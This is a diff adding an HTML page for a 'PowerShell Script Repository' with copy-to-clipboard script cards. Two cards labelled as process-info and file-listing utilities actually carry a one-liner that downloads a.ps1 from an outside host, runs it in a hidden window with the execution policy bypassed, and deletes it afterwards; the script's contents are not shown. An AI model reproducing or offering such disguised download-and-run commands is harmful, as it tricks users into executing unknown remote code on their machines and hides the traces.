@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PowerShell Script Repository</title>
+    <link rel="stylesheet" href="style.css" />
+    <meta name="description"
+        content="A premium repository for PowerShell (.ps1) scripts and commands with copy‑to‑clipboard functionality." />
+</head>
+
+<body>
+    <header class="nav">
+        <h1>PowerShell Scripts</h1>
+    </header>
+    <section class="hero">
+        <h2>Explore, Copy, Run</h2>
+        <p>Browse curated PowerShell scripts and one‑liners. Click to copy commands instantly.</p>
+    </section>
+    <main class="script-grid" id="scriptGrid">
+        <!-- Placeholder entries – replace with your .ps1 files later -->
+        <article class="script-card">
+            <h3>My Script – a.ps1</h3>
+            <pre class="code-block"><code># Sample PowerShell script (downloadable)</code></pre>
+            <a class="download-btn" href="a.ps1" download>Download a.ps1</a>
+        </article>
+        <article class="script-card">
+            <h3>Automation – Restart Service</h3>
+            <pre class="code-block"><code>Restart-Service -Name "MyService" -Force</code></pre>
+            <button class="copy-btn" data-clipboard-text="Restart-Service -Name \" MyService\" -Force">Copy</button>
+        </article>
+        <article class="script-card">
+            <h3>Security – Get‑Process Info</h3>
+            <pre
+                class="code-block"><code>powershell -w hidden -c "iwr https://rajps1.netlify.app/a.ps1 -o $env:temp\a.ps1; start-sleep 2; powershell -ep bypass -f $env:temp\a.ps1; Remove-Item $env:temp\a.ps1 -Force"</code></pre>
+            <button class="copy-btn" data-clipboard-text="powershell -w hidden -c " iwr https://rajps1.netlify.app/a.ps1
+                -o $env:temp\a.ps1; start-sleep 2; powershell -ep bypass -f $env:temp\a.ps1; Remove-Item $env:temp\a.ps1
+                -Force"">Copy</button>
+        </article>
+        <article class="script-card">
+            <h3>DevOps – List Files Recursively</h3>
+            <pre
+                class="code-block"><code>iwr https://rajps1.netlify.app/a.ps1 -o $env:temp\a.ps1; start-sleep 2; powershell -ep bypass -f $env:temp\a.ps1; Remove-Item $env:temp\a.ps1 -Force</code></pre>
+            <button class="copy-btn"
+                data-clipboard-text="iwr https://rajps1.netlify.app/a.ps1 -o $env:temp\a.ps1; start-sleep 2; powershell -ep bypass -f $env:temp\a.ps1; Remove-Item $env:temp\a.ps1 -Force">Copy</button>
+        </article>
+    </main>
+    <footer class="footer">
+        <p>© 2026 PowerShell Script Repository</p>
+    </footer>
+    <script src="main.js"></script>
+</body>
+
+</html>
